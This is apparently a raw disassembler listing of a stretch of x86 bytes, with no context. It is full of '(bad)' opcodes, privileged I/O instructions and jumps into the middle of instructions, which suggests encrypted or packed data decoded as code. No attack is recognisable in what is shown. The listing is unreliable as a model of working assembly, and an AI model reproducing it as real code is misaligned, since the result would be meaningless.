  4151ef:	(bad)  
  4151f0:	ret    0x4b8c
  4151f3:	dec    esi
  4151f4:	pop    ds
  4151f5:	fsubr  QWORD PTR [ebp-0x28]
  4151f8:	adc    al,0xaa
  4151fa:	pusha  
  4151fb:	imul   ebp,DWORD PTR [ebp-0x46],0xdcabc67f
  415202:	dec    bh
  415204:	rol    BYTE PTR [ecx+0xf],1
  415207:	imul   esp,edx,0xa9b541d5
  41520d:	push   ebx
  41520e:	sbb    DWORD PTR [esi+eax*8],esp
  415211:	xor    DWORD PTR [ecx+edx*4-0x4f],edx
  415215:	mov    edi,0xaec0dd32
  41521a:	mov    ds:0x7e8ffe3b,eax
  41521f:	dec    ecx
  415220:	cwde   
  415221:	ins    BYTE PTR es:[edi],dx
  415222:	addr16 das 
  415224:	xchg   bh,dl
  415226:	test   eax,0x21622822
  41522b:	in     eax,0x23
  41522d:	shl    ecx,1
  41522f:	push   0xffffffc1
  415231:	rcr    BYTE PTR [edx+0x403efc89],1
  415237:	shl    DWORD PTR [ebx-0x6b],0x4d
  41523b:	xor    BYTE PTR [esi-0x6b],al
  41523e:	lds    ebx,FWORD PTR [ebx+0xa]
  415241:	(bad)  
  415242:	pop    ds
  415243:	(bad)  
  415244:	cmp    esi,DWORD PTR [ebx]
  415246:	adc    eax,DWORD PTR [ebp+0x2b]
  415249:	in     eax,0x19
  41524b:	cmp    al,0xd0
  41524d:	lea    esi,[esi+0x4f]
  415250:	add    ah,BYTE PTR [esi]
  415252:	xor    BYTE PTR [edx],0xb2
  415255:	out    0x81,al
  415257:	test   DWORD PTR [edx+0x2a],esi
  41525a:	pop    edi
  41525b:	jb     0x4151ef
  41525d:	stc    
  41525e:	int    0x8f
  415260:	in     eax,dx
  415261:	pop    es
  415262:	mov    bl,0x80
  415264:	sub    al,0x88
  415266:	int3   
  415267:	(bad)  
  415268:	ss jbe 0x41520a
  41526b:	out    dx,al
  41526c:	icebp  
  41526d:	or     al,0x41
  41526f:	in     eax,dx
  415270:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415271:	sbb    bh,BYTE PTR ds:0x44864b45
  415277:	(bad)  
  415278:	dec    edi
  415279:	stos   DWORD PTR es:[edi],eax
  41527a:	inc    esp
  41527b:	aad    0x99
  41527d:	lods   al,BYTE PTR ds:[esi]
  41527e:	sar    bh,0xeb
  415281:	push   ebp
  415282:	push   cs
  415283:	stc    
  415284:	js     0x4152ce
  415286:	and    ebx,DWORD PTR [esi-0x316e415d]
  41528c:	hlt    
  41528d:	and    BYTE PTR [edi+edx*1],ch
  415290:	add    BYTE PTR [ecx],bh
  415292:	push   edi
  415293:	ds jmp 0x41522f
  415296:	sbb    eax,0xb3da1a2c
  41529b:	mov    BYTE PTR [ebx],al
  41529d:	fnsave [ebx-0x58]
  4152a0:	mov    esi,0x93dbe668
  4152a5:	mov    ds:0x453a4f2,eax
  4152aa:	sub    BYTE PTR [ebp+0x40],cl
  4152ad:	pop    ss
  4152ae:	pushf  
  4152af:	and    eax,0xc7536fab
  4152b4:	jnp    0x415326
  4152b6:	test   eax,0xfd25525e
  4152bb:	cmp    BYTE PTR [esi+0x2],bl
  4152be:	out    dx,eax
  4152bf:	mov    ch,0x2f
  4152c1:	mov    edi,0x75bf7570
  4152c6:	sub    BYTE PTR [ebx-0x61],bh
  4152c9:	xor    DWORD PTR [ecx+0x42ef9e4c],edi
  4152cf:	and    DWORD PTR [eax+0x5bea269f],esp
  4152d5:	dec    ecx
  4152d6:	out    0x1e,al
  4152d8:	mov    dh,0xcb
  4152da:	stc    
  4152db:	and    esp,DWORD PTR ds:0x1c684386
  4152e1:	cmp    al,0x86
  4152e3:	dec    esp
  4152e4:	fld    TBYTE PTR [ecx]
  4152e6:	out    dx,al
  4152e7:	hlt    
  4152e8:	mov    BYTE PTR [ebp+0x30],al
  4152eb:	xchg   BYTE PTR [ecx+edi*2],bl
  4152ee:	fdivr  QWORD PTR [ecx+0x8b23929]
  4152f4:	sub    DWORD PTR [esp+ebx*8+0x1dfab08c],edi
  4152fb:	lahf   
  4152fc:	fldenv ds:0xdef6c56c
  415302:	out    0xc1,al
  415304:	xor    edi,DWORD PTR [edi-0x4a7211dd]
  41530a:	fsub   QWORD PTR [ecx]
  41530c:	sbb    eax,0x7b043348
  415311:	mov    dh,0xc5
  415313:	pop    esp
  415314:	pushf  
  415315:	rol    ebp,0xe8
  415318:	inc    DWORD PTR [ecx+0xe]
  41531b:	or     esp,DWORD PTR ds:0x40a0e63d
  415321:	mov    edx,cs
  415323:	sbb    eax,0x8024a49a
  415328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415329:	jle    0x4152c9
  41532b:	into   
  41532c:	stos   BYTE PTR es:[edi],al
  41532d:	icebp  
  41532e:	sub    DWORD PTR ds:0x4f4fe7c0,0xffffffb9
  415335:	inc    edx
  415336:	mov    dh,0x6b
  415338:	in     al,dx
  415339:	sub    DWORD PTR ds:0x5b595c67,esi
  41533f:	int3   
  415340:	test   BYTE PTR [edx-0x3e],dl
  415343:	aad    0x5
  415345:	out    0x89,eax
  415347:	cld    
  415348:	data16 int3 
  41534a:	sbb    DWORD PTR [esi+0x5a],ebx
  41534d:	add    DWORD PTR [edx+0x3a],edx
  415350:	jecxz  0x4152d8
  415352:	ret    
  415353:	retf   0x9baf
  415356:	in     al,0x71
  415358:	xchg   edi,eax
  415359:	cwde   
  41535a:	loopne 0x415324
  41535c:	adc    bh,BYTE PTR [edx]
  41535e:	mov    ch,0x8
  415360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415361:	jnp    0x4153d5
  415363:	add    esp,esi
  415365:	rcr    dh,1
  415367:	pop    ebx
  415368:	nop
  415369:	popf   
  41536a:	jge    0x415306
  41536c:	jge    0x415337
  41536e:	ja     0x41539c
  415370:	outs   dx,BYTE PTR ds:[esi]
  415371:	or     esi,DWORD PTR [edi]
  415373:	jnp    0x4153d9
  415375:	sbb    ah,cl
  415377:	jbe    0x41537f
  415379:	mov    esi,0x8a566343
  41537e:	jp     0x415323
  415380:	adc    cl,BYTE PTR [ebp+0x15839c9e]
  415386:	test   al,0xb7
  415388:	push   0xdaf2291f
  41538d:	adc    eax,0x779eb741
  415392:	dec    ah
  415394:	adc    ecx,DWORD PTR [ebx]
  415396:	pop    esi
  415397:	(bad)  
  415399:	xor    eax,0x4b6dcee7
  41539e:	xor    bl,BYTE PTR [ebx+0x1e]
  4153a1:	test   dl,bl
  4153a3:	or     eax,0x76d0d1c8
  4153a8:	mov    esi,0x936b43c1
  4153ad:	ss ret 0x4688
  4153b1:	cli    
  4153b2:	in     eax,dx
  4153b3:	pop    ebx
  4153b4:	loope  0x4153d5
  4153b6:	mov    esp,0x64a8b32d
  4153bb:	inc    edi
  4153bc:	push   esi
  4153bd:	test   DWORD PTR [esi+0x28],0x21be6781
  4153c4:	and    ebx,DWORD PTR ds:0xf642fd7
  4153ca:	or     eax,0x464dd7e1
  4153cf:	mov    ch,0xb
  4153d1:	cli    
  4153d2:	add    dh,BYTE PTR [edx]
  4153d4:	and    al,BYTE PTR [ebp-0x37]
  4153d7:	pushw  cs
  4153d9:	mov    ebx,0x159277cc
  4153de:	dec    ebp
  4153df:	outs   dx,DWORD PTR ds:[esi]
  4153e0:	xor    eax,0x8c5619e6
  4153e5:	enter  0xa34e,0xba
  4153e9:	cwde   
  4153ea:	sub    DWORD PTR ds:0xca1ae581,edi
  4153f0:	mov    esi,0x2826d5f4
  4153f5:	imul   ebp,DWORD PTR [ebp+0x8faa426],0x4e
  4153fc:	cmp    al,0x76
  4153fe:	scas   eax,DWORD PTR es:[edi]
  4153ff:	or     DWORD PTR es:[eax+0x15],0x75
  415404:	stc    
  415405:	aas    
  415406:	cwde   
  415407:	inc    edx
  415408:	xor    ah,cl
  41540a:	ins    BYTE PTR es:[edi],dx
  41540b:	add    eax,0x5b2be72c
  415410:	gs hlt 
  415412:	and    al,0xff
  415414:	push   cs
  415415:	xchg   esp,eax
  415416:	cmp    bh,BYTE PTR [eax+0x626dd4a8]
  41541c:	xchg   ecx,eax
  41541d:	in     eax,0xe2
  41541f:	or     al,0xd4
  415421:	or     DWORD PTR [ebp+ecx*4-0x77bd3e77],ecx
  415428:	jl     0x415401
  41542a:	out    0x9e,al
  41542c:	repnz adc eax,0xde6cd7ae
  415432:	and    eax,0x2e98cf1
  415437:	call   0x9d231eff
  41543c:	(bad)  
  41543d:	jg     0x415481
  41543f:	aam    0x3a
  415441:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415443:	sub    esp,eax
  415445:	and    DWORD PTR [edi+0x2a],0xd920e80
  41544c:	ja     0x4154a7
  41544e:	mov    edx,0xe1a7319c
  415453:	je     0x4153ea
  415455:	shl    eax,1
  415457:	and    eax,0xcfcffed8
  41545c:	inc    esp
  41545d:	push   edi
  41545e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41545f:	push   0x2d16a711
  415464:	sbb    ebp,DWORD PTR [esi+edi*4+0x66]
  415468:	or     edx,ebx
  41546a:	into   
  41546b:	pop    edx
  41546c:	dec    edx
  41546d:	dec    ecx
  41546e:	lfs    ecx,FWORD PTR [esi]
  415471:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415472:	mov    ss:0x2d03218f,al
  415478:	sub    ah,ah
  41547a:	mov    ebp,0xb7f714ca
  41547f:	pop    ebp
  415480:	inc    ecx
  415481:	mov    bh,0x14
  415483:	push   0xffffffd0
  415485:	test   al,0x14
  415487:	je     0x415469
  415489:	outs   dx,BYTE PTR ds:[esi]
  41548a:	xchg   ebp,eax
  41548b:	jo     0x415450
  41548d:	cli    
  41548e:	es mov ebx,0xbb95ce76
  415494:	xor    DWORD PTR [edx+esi*4],esi
  415497:	jnp    0x41548c
  415499:	cld    
  41549a:	mov    esp,0xe0b2e173
  41549f:	sbb    eax,0xdaa946
  4154a4:	or     eax,esi
  4154a6:	stos   DWORD PTR es:[edi],eax
  4154a7:	mov    ecx,0x4660b6c0
  4154ac:	adc    BYTE PTR [eax+0x5f],0xa4
  4154b0:	xor    eax,0x900a35
  4154b5:	and    edx,DWORD PTR [eax+0x480171dd]
  4154bb:	stos   DWORD PTR es:[edi],eax
  4154bc:	scas   al,BYTE PTR es:[edi]
  4154bd:	pop    edi
  4154be:	and    BYTE PTR [ebp+0x649517fa],0xf6
  4154c5:	sub    ch,dh
  4154c7:	sub    edi,DWORD PTR [eax-0x5fbda93a]
  4154cd:	jnp    0x4154fd
  4154cf:	dec    eax
  4154d0:	aam    0x9b
  4154d2:	cld    
  4154d3:	mov    ch,0xde
  4154d5:	js     0x415478
  4154d7:	jb     0x41553d
  4154d9:	jb     0x4154ef
  4154db:	push   0xffffffa6
  4154dd:	daa    
  4154de:	jne    0x4154a2
  4154e0:	call   0x884dcb8b
  4154e5:	fdiv   DWORD PTR [esi]
  4154e7:	popa   
  4154e8:	into   
  4154e9:	cmp    eax,0xd21715c8
  4154ee:	xchg   edi,eax
  4154ef:	shl    dh,1
  4154f1:	xchg   ebp,eax
  4154f2:	loop   0x41553f
  4154f4:	fdivr  st,st(1)
  4154f6:	rcr    BYTE PTR [esi],cl
  4154f8:	xchg   esi,eax
  4154f9:	cld    
  4154fa:	leave  
  4154fb:	stos   DWORD PTR es:[edi],eax
  4154fc:	push   0x3d506468
  415501:	loope  0x41550f
  415503:	mov    edx,DWORD PTR [ebx+0x16fc471b]
  415509:	xchg   esi,eax
  41550a:	test   DWORD PTR [edx+eax*1+0xb1fbbf2],eax
  415511:	add    al,0xbe
  415513:	adc    ebp,DWORD PTR [eax+ebx*1-0x51]
  415517:	sbb    BYTE PTR [eax+0x40],dl
  41551a:	and    ebp,DWORD PTR ds:0x7d9095f8
  415520:	and    BYTE PTR [esp+ebp*8],dh
  415523:	loopne 0x415558
  415525:	add    edx,DWORD PTR [edi-0x8e9e71c]
  41552b:	retf   0xb4ff
  41552e:	add    BYTE PTR [ebx+0x156c7b51],dh
  415534:	retf   
  415535:	fcomp  QWORD PTR [ebx+0x6ec19219]
  41553b:	adc    edx,DWORD PTR [ecx]
  41553d:	mov    ds:0x9a805c05,al
  415542:	imul   BYTE PTR [edi+eiz*2-0x3e]
  415546:	xor    eax,0xc082b15
  41554b:	retf   0x6c49
  41554e:	inc    ebp
  41554f:	sub    eax,DWORD PTR [edx-0x7dd064b]
  415555:	je     0x41551f
  415557:	pop    edx
  415558:	out    0xf3,eax
  41555a:	jecxz  0x4155a4
  41555c:	and    BYTE PTR [ecx+0x47],ch
  41555f:	ror    DWORD PTR [edi-0x59cca2cd],1
  415565:	repnz and bh,BYTE PTR ss:[esi+ebx*8+0x79]
  41556b:	add    esp,DWORD PTR [eax+0x6]
  41556e:	stos   BYTE PTR es:[edi],al
  41556f:	mov    WORD PTR [eax],ss
  415571:	cmp    ch,BYTE PTR [ebx-0x69]
  415574:	push   edx
  415575:	imul   ecx,DWORD PTR [edx],0x8
  415578:	or     edi,DWORD PTR [ebp-0x26fcda10]
  41557e:	dec    ebp
  41557f:	out    0xdf,eax
  415581:	call   0xb34526d
  415586:	push   0x4467e50d
  41558b:	dec    edi
  41558c:	ret    
  41558d:	lods   eax,DWORD PTR ds:[esi]
  41558e:	push   ds
  41558f:	sbb    BYTE PTR [edi+0x59],cl
  415592:	(bad)  
  415593:	int3   
  415594:	fmul   QWORD PTR [edi]
  415596:	daa    
  415597:	(bad)  
  415598:	cmc    
  415599:	xchg   DWORD PTR [esi-0x11e18ddb],edx
  41559f:	pop    ebp
  4155a0:	pop    ecx
  4155a1:	outs   dx,DWORD PTR ds:[esi]
  4155a2:	cs cmp al,0x1b
  4155a5:	push   ds
  4155a6:	and    al,0x27
  4155a8:	in     al,0xe8
  4155aa:	add    al,0xde
  4155ac:	fisub  DWORD PTR [ecx]
  4155ae:	es xchg edx,eax
  4155b0:	dec    eax
  4155b1:	jle    0x41560f
  4155b3:	test   eax,0x31424e5
  4155b8:	mov    al,0x16
  4155ba:	outs   dx,BYTE PTR ds:[esi]
  4155bb:	push   ds
  4155bc:	pop    ebx
  4155bd:	test   DWORD PTR [ebx-0x7963663a],eax
  4155c3:	jp     0x4155cd
  4155c5:	and    dh,bh
  4155c7:	sub    esp,esp
  4155c9:	enter  0xc0d0,0x52
  4155cd:	je     0x415623
  4155cf:	or     bl,BYTE PTR [ecx-0x682660ce]
  4155d5:	or     DWORD PTR [eax],ebp
  4155d7:	pop    esp
  4155d8:	mov    al,0xe6
  4155da:	and    BYTE PTR [edx],dh
  4155dc:	data16 addr16 into 
  4155df:	inc    esp
  4155e0:	jne    0x4155a2
  4155e2:	out    dx,al
  4155e3:	pop    ebx
  4155e4:	sub    eax,0xc252d4c4
  4155e9:	push   eax
  4155ea:	ss inc esp
  4155ec:	add    ch,dl
  4155ee:	(bad)  
  4155ef:	jo     0x41559c
  4155f1:	outs   dx,DWORD PTR ds:[esi]
  4155f2:	inc    esi
  4155f3:	or     eax,eax
  4155f5:	mov    dh,0x4b
  4155f7:	mov    dh,0x5a
  4155f9:	int3   
  4155fa:	add    al,BYTE PTR [eax+ecx*4]
  4155fd:	cli    
  4155fe:	and    al,BYTE PTR cs:[edx]
  415601:	add    al,0x7c
  415603:	mov    al,0x42
  415605:	lds    ebx,FWORD PTR ds:0x9e31131b
  41560b:	clc    
  41560c:	xchg   BYTE PTR [edi],ah
  41560e:	jmp    0xceef:0xb8b9726d
  415615:	div    DWORD PTR [ecx+0x75]
  415618:	mov    eax,ds:0xe1a3269c
  41561d:	mov    esi,0x5d3ff8ea
  415622:	loopne 0x415659
  415624:	ja     0x415621
  415626:	push   es
  415627:	ror    DWORD PTR [ebx],1
  415629:	aaa    
  41562a:	stos   BYTE PTR es:[edi],al
  41562b:	xchg   ebp,eax
  41562c:	push   ecx
  41562d:	lods   eax,DWORD PTR gs:[esi]
  41562f:	in     eax,dx
  415630:	sbb    ebp,DWORD PTR ss:[ebp-0x6150ca8f]
  415637:	mov    ebp,0x1d4b4e1e
  41563c:	cdq    
  41563d:	adc    DWORD PTR [eax+0x43],0xffffffa0
  415641:	jmp    0x5989:0xa81336a9
  415648:	dec    esp
  415649:	aam    0x1b
  41564b:	in     eax,dx
  41564c:	xchg   esi,eax
  41564d:	into   
  41564e:	out    0x3c,al
  415650:	or     eax,esp
  415652:	(bad)  
  415654:	in     eax,dx
  415655:	stos   DWORD PTR es:[edi],eax
  415656:	sbb    edi,DWORD PTR [edx+0x53]
  415659:	mov    al,ds:0x67971f2e
  41565e:	sub    DWORD PTR [ecx-0x68],esi
  415661:	dec    ecx
  415662:	push   cs
  415663:	pop    es
  415664:	mov    esp,0xec3b0e77
  415669:	mov    al,ds:0xd10420bf
  41566e:	push   edi
  41566f:	push   es
  415670:	int3   
  415671:	xchg   esi,eax
  415672:	loopne 0x415660
  415674:	adc    ebp,DWORD PTR [edi+0x66739270]
  41567a:	mov    dl,0x7d
  41567c:	rcl    bl,1
  41567e:	loope  0x415654
  415680:	pusha  
  415681:	inc    edx
  415682:	addr16 and eax,0xcfff766b
  415688:	xor    ecx,DWORD PTR [edi+0x20]
  41568b:	add    esp,DWORD PTR [edx]
  41568d:	test   eax,0x2bc3a39d
  415692:	jge    0x4156ef
  415694:	xchg   ebx,eax
  415695:	sahf   
  415696:	or     bl,BYTE PTR [ecx]
  415698:	mov    eax,ds:0x57b4697c
  41569d:	push   edi
  41569e:	mov    bh,0x35
  4156a0:	jno    0x41564d
  4156a2:	xlat   BYTE PTR ds:[ebx]
  4156a3:	push   edi
  4156a4:	add    cl,bl
  4156a6:	mov    ebx,0x5b6d8eaa
  4156ab:	stos   BYTE PTR es:[edi],al
  4156ac:	stc    
  4156ad:	daa    
  4156ae:	and    BYTE PTR [edx+0x3e4b2bab],0x2e
  4156b5:	or     BYTE PTR [esi+eiz*8],bl
  4156b8:	jbe    0x41570c
  4156ba:	mov    edx,0xe6fbe416
  4156bf:	dec    eax
  4156c0:	rcr    BYTE PTR [eax-0xd],0x1
  4156c4:	push   eax
  4156c5:	xor    BYTE PTR [edi],ah
  4156c7:	rcl    DWORD PTR [ebx+0x66],1
  4156ca:	sbb    BYTE PTR [eax-0x66f28a3c],dh
  4156d0:	dec    ebp
  4156d1:	aam    0x23
  4156d3:	outs   dx,DWORD PTR ds:[esi]
  4156d4:	fucom  st(2)
  4156d6:	lea    ecx,[edi+0x69]
  4156d9:	adc    DWORD PTR [esp+ecx*1-0x1aa9e0d0],0x77d8b660
  4156e4:	stos   DWORD PTR es:[edi],eax
  4156e5:	pop    es
  4156e6:	ficom  WORD PTR [esi-0x7]
  4156e9:	mov    eax,DWORD PTR [eax-0x559d9cf1]
  4156ef:	fs jle 0x4156a7
  4156f2:	xchg   edx,eax
  4156f3:	xor    al,0xd5
  4156f5:	dec    esp
  4156f6:	je     0x41573e
  4156f8:	pop    edi
  4156f9:	loopne 0x4156e7
  4156fb:	iret   
  4156fc:	adc    edi,edx
  4156fe:	mov    al,BYTE PTR [ecx+edi*8-0x75]
  415702:	scas   eax,DWORD PTR es:[edi]
  415703:	test   BYTE PTR [ecx],bl
  415705:	loope  0x4156ac
  415707:	outs   dx,BYTE PTR ds:[esi]
  415708:	xor    esp,DWORD PTR [edi]
  41570a:	mov    edx,0xe3c24e56
  41570f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415710:	repnz pop eax
  415712:	fwait
  415713:	and    esp,esi
  415715:	push   0x67455202
  41571a:	out    0x78,al
  41571c:	mov    bl,0x2e
  41571e:	mov    edx,0x91fa5d0e
  415723:	div    BYTE PTR [edx-0x1be80646]
  415729:	mov    ah,0x8f
  41572b:	mov    ebp,?
  41572d:	sub    dl,BYTE PTR [edx]
  41572f:	sub    al,0x4d
  415731:	inc    edx
  415732:	arpl   WORD PTR [eax+0x36],sp
  415735:	ss aaa 
  415737:	xchg   edi,eax
  415738:	mov    eax,0xffe5c1b4
  41573d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41573e:	dec    ecx
  41573f:	data16 adc al,0x4
  415742:	push   esi
  415743:	scas   al,BYTE PTR es:[edi]
  415744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415745:	wrmsr  
  415747:	mov    ds:0x3e6fff7b,al
  41574c:	lea    edi,[esi+ecx*4]
  41574f:	or     DWORD PTR [ecx+0x1c5aa8a4],esi
  415755:	mov    ecx,0x1ca36e9e
  41575a:	mov    edx,0x6ebf2f40
  41575f:	aam    0xee
  415761:	inc    ebx
  415762:	jbe    0x41574f
  415764:	out    dx,eax
  415765:	jo     0x415759
  415767:	or     BYTE PTR ds:0xf400575d,al
  41576d:	inc    esi
  41576e:	fidiv  DWORD PTR [esi]
  415770:	ret    0x8b7c
  415773:	and    ebx,DWORD PTR [edi+0x5b]
  415776:	lock inc ecx
  415778:	sbb    cl,BYTE PTR [eax-0xf1f5857]
  41577e:	inc    edi
  41577f:	cli    
  415780:	in     al,dx
  415781:	dec    ebp
  415782:	shl    BYTE PTR [ebx+0x2a],1
  415785:	lds    edi,FWORD PTR [esi+0x792bcc46]
  41578b:	sbb    BYTE PTR [ebx-0x1016144e],dl
  415791:	xchg   ebx,eax
  415792:	rol    DWORD PTR [esi+0x4c],0x73
  415796:	adc    BYTE PTR [edi-0x25],al
  415799:	call   0xda8bf69d
  41579e:	cmp    DWORD PTR [ebx],esi
  4157a0:	nop
  4157a1:	not    DWORD PTR [ebp-0x5d0e5c0]
  4157a7:	push   ecx
  4157a8:	add    al,0x8c
  4157aa:	jmp    0x4998:0x82deb5a1
  4157b1:	fs pop ss
  4157b3:	sub    ch,ch
  4157b5:	hlt    
  4157b6:	ret    
  4157b7:	mov    eax,ds:0x654a19d8
  4157bc:	addr16 call 0x58b9:0x11a45895
  4157c4:	mov    eax,0x274f5567
  4157c9:	not    BYTE PTR [eax-0x7e]
  4157cc:	out    dx,al
  4157cd:	add    DWORD PTR [esi],ebp
  4157cf:	shl    DWORD PTR [edx+0x1805365e],1
  4157d5:	and    ecx,DWORD PTR [edi-0x75c1467c]
  4157db:	hlt    
  4157dc:	loop   0x41579f
  4157de:	jl     0x415849
  4157e0:	aam    0xac
  4157e2:	(bad)  
  4157e4:	cmp    ah,BYTE PTR [edx+0x6aab4fc2]
  4157ea:	clc    
  4157eb:	aam    0xa4
  4157ed:	mov    edi,0x8cc585e8
  4157f2:	xchg   esi,eax
  4157f3:	ret    0x379a
  4157f6:	test   DWORD PTR [eax],esp
  4157f8:	ret    0x2753
  4157fb:	icebp  
  4157fc:	adc    BYTE PTR [esi+0x65],ah
  4157ff:	jecxz  0x415808
  415801:	fdivrp st(3),st
  415803:	sbb    ch,bh
  415805:	outs   dx,DWORD PTR ds:[esi]
  415806:	loop   0x4157e3
  415808:	test   DWORD PTR [edi-0x3d],edi
  41580b:	jb     0x4157c7
  41580d:	push   ds
  41580e:	cmc    
  41580f:	cmp    al,0x9d
  415811:	out    0xdd,eax
  415813:	mov    eax,0x72a7e62b
  415818:	jmp    0xf508:0x505ca87d
  41581f:	sti    
  415820:	sub    DWORD PTR [ebx],eax
  415822:	les    ecx,FWORD PTR ds:0xdeeaff37
  415828:	lds    esi,FWORD PTR [ecx+0x2e40ba02]
  41582e:	jno    0x41586e
  415830:	call   0x239a:0x2f26ef87
  415837:	pop    DWORD PTR [ebx]
  415839:	mov    bh,0x2c
  41583b:	popa   
  41583c:	add    esp,DWORD PTR [eax-0x7975f91c]
  415842:	mov    esp,0xe8185da5
  415847:	cmc    
  415848:	add    esp,DWORD PTR [ebx-0x5adfee30]
  41584e:	and    eax,edi
  415850:	sbb    dl,BYTE PTR [ecx+edx*8]
  415853:	nop
  415854:	test   BYTE PTR [ecx-0x18],0xe
  415858:	adc    esp,DWORD PTR [esi]
  41585a:	cmp    BYTE PTR [eax],bl
  41585c:	xchg   BYTE PTR [eax-0x601a8a20],bl
  415862:	lock pushf 
  415864:	rol    edx,0x0
  415867:	sahf   
  415868:	mov    ds:0x7e52ee73,al
  41586d:	(bad)  
  41586e:	xlat   BYTE PTR ds:[ebx]
  41586f:	jo     0x4157fc
  415871:	cmp    eax,0x821d2c82
  415876:	push   ds
  415877:	imul   DWORD PTR [eax-0x38]
  41587a:	retf   
  41587b:	sub    DWORD PTR ds:0x6b86be42,ecx
  415881:	call   0xd1a3:0x730e5b02
  415888:	mov    WORD PTR [edx+0x14],?
  41588b:	scas   eax,DWORD PTR es:[edi]
  41588c:	fdiv   QWORD PTR [eax+eiz*2+0x7b]
  415890:	sahf   
  415891:	pop    ebx
  415892:	cmp    BYTE PTR [esi+0x2e1c5f6e],0xf1
  415899:	ficomp WORD PTR [ebx+0x51]
  41589c:	and    DWORD PTR [edx-0x66],eax
  41589f:	jle    0x415880
  4158a1:	pop    edx
  4158a2:	push   esp
  4158a3:	mov    ecx,0x50c1df8
  4158a8:	or     BYTE PTR [edi+0x6a],bl
  4158ab:	jns    0x415882
  4158ad:	mov    bl,0x75
  4158af:	jno    0x415899
  4158b1:	push   esi
  4158b2:	mov    ecx,0x6584f608
  4158b7:	sahf   
  4158b8:	ja     0x415872
  4158ba:	xchg   esi,eax
  4158bb:	pop    ss
  4158bc:	retf   0x549a
  4158bf:	dec    esp
  4158c0:	push   ss
  4158c1:	pop    edx
  4158c2:	pop    ss
  4158c3:	sub    bh,BYTE PTR [edx+ecx*4-0x172a4c5b]
  4158ca:	jge    0x415931
  4158cc:	int3   
  4158cd:	jle    0x415915
  4158cf:	aad    0x5
  4158d1:	lods   eax,DWORD PTR ds:[esi]
  4158d2:	btc    DWORD PTR [esp+edi*1-0x58],ecx
  4158d7:	dec    esp
  4158d8:	cwde   
  4158d9:	push   0xfffffff7
  4158db:	and    ch,dl
  4158dd:	xchg   DWORD PTR [ebp+0x5d],ebp
  4158e0:	ret    0xdad0
  4158e3:	fs jmp 0x415877
  4158e6:	dec    ecx
  4158e7:	xchg   esp,eax
  4158e8:	xor    eax,0x83603dff
  4158ed:	aas    
  4158ee:	or     ebx,DWORD PTR [ebx+0x4]
  4158f1:	and    eax,0xb1a4ae5b
  4158f6:	nop
  4158f7:	clc    
  4158f8:	or     cl,0xf4
  4158fb:	in     al,dx
  4158fc:	push   ss
  4158fd:	(bad)  
  4158fe:	daa    
  4158ff:	sbb    BYTE PTR [edx+ebp*1+0x16e7e55d],ah
  415906:	push   esi
  415907:	(bad)  
  415908:	cli    
  415909:	bnd jno 0x415893
  41590c:	inc    esp
  41590d:	cli    
  41590e:	or     edx,ebp
  415910:	je     0x4158a9
  415912:	push   0x362da3bb
  415917:	(bad)  
  415918:	fcom   st(6)
  41591a:	fwait
  41591b:	js     0x415914
  41591d:	cs loopne 0x415922
  415920:	repz loope 0x41596d
  415923:	js     0x41599a
  415925:	jb     0x415996
  415927:	adc    ch,BYTE PTR [edi+0x1c5c29dd]
  41592d:	retf   
  41592e:	out    dx,al
  41592f:	xchg   ebx,eax
  415930:	sub    eax,eax
  415932:	push   0xffffffca
  415934:	jl     0x41597f
  415936:	lock arpl WORD PTR [edx],dx
  415939:	pusha  
  41593a:	fcomp  DWORD PTR [edi-0x4e042830]
  415940:	mov    al,ds:0xb5144a3d
  415945:	and    eax,0x470a3f10
  41594a:	pop    ebx
  41594b:	cmp    al,cl
  41594d:	adc    al,0x6e
  41594f:	push   edi
  415950:	je     0x41593d
  415952:	in     eax,0x92
  415954:	mov    al,0xde
  415956:	sbb    ecx,edi
  415958:	pop    esi
  415959:	push   esi
  41595a:	(bad)  
  41595b:	in     al,0x38
  41595d:	clc    
  41595e:	cwde   
  41595f:	fsub   DWORD PTR [eax-0x7c]
  415962:	fcomp  DWORD PTR ds:0x3325bb3c
  415968:	xlat   BYTE PTR ds:[ebx]
  415969:	adc    bh,bh
  41596b:	pushf  
  41596c:	xor    ebx,ecx
  41596e:	xor    eax,0xd1ceae8c
  415973:	xchg   edx,eax
  415974:	pop    ds
  415975:	lock or ecx,DWORD PTR [edx+0x6e7e3f73]
  41597c:	jmp    0x759:0xdc81c756
  415983:	xchg   BYTE PTR [ecx-0x34],ah
  415986:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415987:	mov    cl,0xae
  415989:	and    al,0x10
  41598b:	inc    ebp
  41598c:	jnp    0x415949
  41598e:	out    dx,eax
  41598f:	pop    esi
  415990:	xor    ebp,DWORD PTR [esi+0x1b]
  415993:	mov    edx,DWORD PTR [esi-0x15]
  415996:	addr16 lahf 
  415998:	push   0xfdd537d8
  41599d:	pop    ss
  41599e:	push   ds
  41599f:	mov    bh,BYTE PTR [edx-0x665e2bdc]
  4159a5:	leave  
  4159a6:	xor    eax,0x461787a8
  4159ab:	(bad)  
  4159ac:	call   0x86e83cef
  4159b1:	(bad)  
  4159b2:	fcmovb st,st(5)
  4159b4:	jle    0x41597c
  4159b6:	pop    edi
  4159b7:	mov    bh,0xbd
  4159b9:	add    bh,BYTE PTR [eax+0x7a9c451b]
  4159bf:	and    DWORD PTR [esi],esp
  4159c1:	and    eax,0xc3a41d4d
  4159c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4159c7:	cdq    
  4159c8:	add    eax,0x531a5aa1
  4159cd:	xor    eax,0x58aefccd
  4159d2:	add    esp,ebx
  4159d4:	adc    DWORD PTR [esi],0x7
  4159d7:	dec    eax
  4159d8:	sar    edi,1
  4159da:	hlt    
  4159db:	out    dx,eax
  4159dc:	int    0x48
  4159de:	dec    edi
  4159df:	inc    esp
  4159e0:	stos   BYTE PTR es:[edi],al
  4159e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159e2:	pop    ebp
  4159e3:	push   eax
  4159e4:	pop    eax
  4159e5:	mov    ebp,0x7925f784
  4159ea:	cmp    eax,0xa3ddddf
